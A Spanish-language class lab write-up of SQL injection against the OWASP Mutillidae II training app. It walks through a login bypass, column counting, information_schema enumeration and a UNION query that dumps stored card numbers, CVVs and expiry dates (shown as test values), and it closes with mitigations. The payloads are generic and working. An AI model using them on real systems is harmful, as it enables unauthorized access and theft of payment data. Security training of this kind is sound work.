# Práctica SQLi - OWASP Mutillidae II (clase 2026-10-23)

Laboratorio autorizado: `https://playground.kontinuagroup.com:8443` (Mutillidae 2.12.8, Security Level 0).
Objetivo: extraer los números de tarjeta de crédito mediante inyección SQL, sin credenciales válidas.

## Técnicas usadas

1. Authentication bypass (login).
2. UNION-based SQL injection (User Lookup).
3. Enumeración de esquema con `information_schema`.

## Paso 1 — Bypass de login

URL: `index.php?page=login.php`. Campo **Username** (password vacío):

```
' OR 1=1-- -
```

Query en el servidor:

```sql
SELECT * FROM accounts WHERE username='' OR 1=1-- -' AND password=''
```

La comilla cierra la cadena, `OR 1=1` siempre es verdadero, `-- -` comenta el resto.
Entra como el primer registro de `accounts` sin conocer usuario ni contraseña.

## Paso 2 — Contar columnas

URL: `index.php?page=user-info.php`. Campo **Name**:

```
' ORDER BY 10-- -
```

`ORDER BY 10` no da error; `ORDER BY 11` devuelve "Unknown column" → la tabla `accounts`
tiene 10 columnas. El UNION debe traer exactamente 10 valores.

## Paso 3 — Enumerar tablas y columnas

Tablas de la base actual:

```
' UNION SELECT 1,table_name,3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database()-- -
```

Aparece `credit_cards`. Sus columnas:

```
' UNION SELECT 1,column_name,3,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='credit_cards'-- -
```

Resultado: `ccid, ccnumber, ccv, expiration`.

`table_name` y `column_name` van en la posición 2 porque User Lookup solo imprime las
columnas 2, 3 y 4 (campos Username, Password, Signature). El resto son relleno.

## Paso 4 — Extraer tarjetas

Campo **Name**:

```
' UNION SELECT 1,ccnumber,ccv,expiration,5,6,7,8,9,10 FROM credit_cards-- -
```

Salida (número / CVV / expiración; números de prueba Luhn-válidos, no reales):

| Número | CVV | Expira |
|--------|-----|--------|
| 4111111111111111 | 123 | 2024-10-01 |
| 5555555555554444 | 321 | 2025-04-01 |
| 378282246310005 | 231 | 2026-03-01 |
| 6011111111111117 | 456 | 2027-06-01 |
| 4222222222222 | 789 | 2028-11-01 |
| 4000002760003184 | 123 | 2025-08-01 |
| 2223000048400011 | 234 | 2026-09-01 |
| 6011000990139424 | 345 | 2027-02-01 |
| 4000000000000002 | 456 | 2025-05-01 |
| 3566002020360505 | 567 | 2024-12-01 |
| 5038370200000000 | 678 | 2026-07-01 |

## Mitigación

- Prepared statements con parámetros: `WHERE username=? AND password=?`. Corta la inyección.
- Least privilege: la cuenta de BD de la app no debe poder leer `credit_cards`.
- No almacenar PAN ni CVV en claro (PCI-DSS exige tokenización; el CVV nunca se guarda).
- Defensa en capas: validación de entrada + WAF, además de lo anterior.
